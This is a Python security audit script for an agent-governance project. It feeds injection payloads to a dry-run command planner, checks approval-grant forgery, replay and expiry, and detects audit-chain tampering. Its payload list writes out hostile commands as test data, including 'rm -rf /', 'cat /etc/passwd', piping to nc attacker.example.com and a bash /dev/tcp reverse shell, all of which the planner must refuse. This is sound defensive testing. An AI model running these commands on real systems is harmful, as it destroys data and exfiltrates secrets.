"""Security audit that actually exercises the controls it reports on.

An earlier version of this script hashed a list of attack strings and printed
"quarantined" beside each one. It never fed a single payload to anything that
could have been exploited, so its output meant nothing. This version drives
real payloads through the real code paths and reports what those paths did.

What it checks:
1. Every injection payload is presented to the command planner, and the planner
   must refuse it and must not have executed anything.
2. Every payload is presented to the diff parser, which must not raise.
3. A forged approval grant, a replayed grant, a grant for a different action and
   an expired grant are each presented to the grant issuer and must be refused.
4. A stored audit record is edited and the chain must detect it.
5. The planner module is parsed and must import no execution primitive.

Usage:
    python scripts/security_audit.py

Exit code 0 means every control behaved. 1 means at least one did not.
"""
import ast
import inspect
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dataclasses import replace  # noqa: E402

from src.domain.approval_grant import ApprovalGrantIssuer  # noqa: E402
from src.domain.audit_chain import verify_chain  # noqa: E402
from src.domain.governed_action import ActionState, AuditLogRecord, GovernedAction  # noqa: E402
from src.domain.semantic_diff import UnifiedDiffParser  # noqa: E402
from src.infrastructure import dry_run_executor as planner_module  # noqa: E402
from src.infrastructure.audit_repository import InMemoryAuditRepository  # noqa: E402
from src.infrastructure.dry_run_executor import DryRunExecutor  # noqa: E402

PASS = "[PASS]"
FAIL = "[FAIL]"

INJECTION_PAYLOADS = [
    ("git status; rm -rf /", "shell chaining"),
    ("curl http://169.254.169.254/latest/meta-data/", "cloud metadata exfiltration"),
    ("git status && cat /etc/passwd", "command conjunction"),
    ("git status | nc attacker.example.com 4444", "pipe to a listener"),
    ("docker run -v /var/run/docker.sock:/var/run/docker.sock alpine", "docker socket mount"),
    ("git status > /etc/crontab", "redirect over a system file"),
    ("python -c \"import os; os.system('id')\"", "interpreter escape"),
    ("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "reverse shell"),
    ("git status `whoami`", "backtick substitution"),
    ("git status $(id)", "dollar substitution"),
    ("../../../../bin/sh", "path traversal to a shell"),
    ("aws ecs update-service --cluster prod --force-new-deployment", "unallowlisted cloud mutation"),
]

MALFORMED_PATCHES = [
    "",
    "not a diff at all",
    "diff --git",
    "diff --git a/x b/x\n@@ malformed hunk @@\n+++++",
    "diff --git a/x b/x\n" + ("+" + "A" * 5000 + "\n") * 20,
    "diff --git a/\x00 b/\x00\n+null byte in the path",
]


class Report:
    def __init__(self) -> None:
        self.failures = 0
        self.total = 0

    def check(self, ok: bool, title: str, detail: str = "") -> None:
        self.total += 1
        if not ok:
            self.failures += 1
        print(f"  {PASS if ok else FAIL} {title}" + (f" -> {detail}" if detail else ""))


def audit_command_planner(report: Report) -> None:
    print("\n1. Injection payloads presented to the command planner")
    executor = DryRunExecutor()
    for payload, label in INJECTION_PAYLOADS:
        plan = executor.plan(payload)
        refused = (plan.allowed is False) and (plan.executed is False) and bool(plan.refusal_reason)
        report.check(refused, f"refused: {label}", plan.refusal_reason or "PLANNER ALLOWED IT")


def audit_patch_parser(report: Report) -> None:
    print("\n2. Malformed and hostile patches presented to the parser")
    for index, patch in enumerate(MALFORMED_PATCHES):
        try:
            sections = UnifiedDiffParser.parse_patch(patch)
            report.check(True, f"patch fixture {index} parsed without raising",
                         f"{len(sections)} sections")
        except Exception as exc:  # noqa: BLE001 - a raise here is the finding
            report.check(False, f"patch fixture {index} raised", f"{type(exc).__name__}: {exc}")


def audit_approval_grants(report: Report) -> None:
    print("\n3. Approval grants presented to the issuer")
    issuer = ApprovalGrantIssuer(b"security-audit-signing-secret-01")
    payload_hash = GovernedAction.compute_payload_hash("RUN_TESTS", "pytest tests/unit")
    grant = issuer.issue("act-audit", payload_hash, time.time() + 300)

    version, body, signature = grant.split(".")
    forged = f"{version}.{body}.{'A' if signature[0] != 'A' else 'B'}{signature[1:]}"
    verdict = issuer.verify(forged, "act-audit", payload_hash)
    report.check(not verdict.accepted and verdict.refusal.value == "BAD_SIGNATURE",
                 "forged signature refused", verdict.detail)

    rogue = ApprovalGrantIssuer(b"a-completely-different-secret-x").issue(
        "act-audit", payload_hash, time.time() + 300)
    verdict = issuer.verify(rogue, "act-audit", payload_hash)
    report.check(not verdict.accepted, "grant minted with another key refused", verdict.detail)

    verdict = issuer.verify(grant, "act-somewhere-else", payload_hash)
    report.check(not verdict.accepted and verdict.refusal.value == "WRONG_ACTION",
                 "grant bound to a different action refused", verdict.detail)

    altered_hash = GovernedAction.compute_payload_hash("RUN_TESTS", "pytest tests/unit --exitfirst")
    verdict = issuer.verify(grant, "act-audit", altered_hash)
    report.check(not verdict.accepted and verdict.refusal.value == "CONTENT_MISMATCH",
                 "grant refused after the command changed", verdict.detail)

    expired = issuer.issue("act-expired", payload_hash, time.time() - 1.0)
    verdict = issuer.verify(expired, "act-expired", payload_hash)
    report.check(not verdict.accepted and verdict.refusal.value == "EXPIRED",
                 "expired grant refused", verdict.detail)

    first = issuer.verify(grant, "act-audit", payload_hash)
    second = issuer.verify(grant, "act-audit", payload_hash)
    report.check(first.accepted and not second.accepted and second.refusal.value == "REPLAYED",
                 "grant accepted once and refused on replay", second.detail)


def audit_chain_tamper_detection(report: Report) -> None:
    print("\n4. Tampering with a stored audit record")
    repo = InMemoryAuditRepository()
    for index in range(3):
        repo.append_audit_record(AuditLogRecord(
            record_id=f"AUDIT-{index}", action_id=f"act-{index}", action_type="RUN_TESTS",
            command="pytest tests/unit", payload_hash="a" * 64, approver_token_hash="b" * 64,
            state=ActionState.EXECUTED, execution_stdout="PLANNED",
            timestamp=f"2026-09-05T00:00:0{index}+00:00",
            staged_by="volcan-agent", approved_by="reviewer",
        ))
    report.check(repo.verify_integrity().intact, "untouched chain verifies",
                 f"head {repo.head_hash[:16]}")

    records = repo.list_records()
    records[1] = replace(records[1], command="rm -rf /")
    verdict = verify_chain(records)
    report.check(not verdict.intact and verdict.broken_at_sequence == 1,
                 "edited record detected", verdict.detail)


def audit_planner_has_no_execution_primitive(report: Report) -> None:
    print("\n5. Static check of the command planner")
    tree = ast.parse(inspect.getsource(planner_module))
    forbidden = {"subprocess", "os", "eval", "exec", "compile", "Popen", "system", "popen"}
    imported: set[str] = set()
    called: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])
        elif isinstance(node, ast.Call):
            target = node.func
            if isinstance(target, ast.Name):
                called.add(target.id)
            elif isinstance(target, ast.Attribute):
                called.add(target.attr)
    report.check(not (imported & forbidden), "planner imports no execution primitive",
                 f"imports {sorted(imported)}")
    report.check(not (called & forbidden), "planner calls no execution primitive")


def main() -> int:
    print("=" * 68)
    print("  VOLCAN SECURITY AUDIT")
    print("  Every check below drives a real payload through real code.")
    print("=" * 68)

    report = Report()
    audit_command_planner(report)
    audit_patch_parser(report)
    audit_approval_grants(report)
    audit_chain_tamper_detection(report)
    audit_planner_has_no_execution_primitive(report)

    print("\n" + "=" * 68)
    passed = report.total - report.failures
    print(f"  SUMMARY: {passed}/{report.total} controls behaved, {report.failures} did not")
    print("  Scope: this audits the controls in this repository. It is not a")
    print("  penetration test and it makes no claim about OWASP coverage.")
    print("=" * 68)
    return 1 if report.failures else 0


if __name__ == "__main__":
    sys.exit(main())
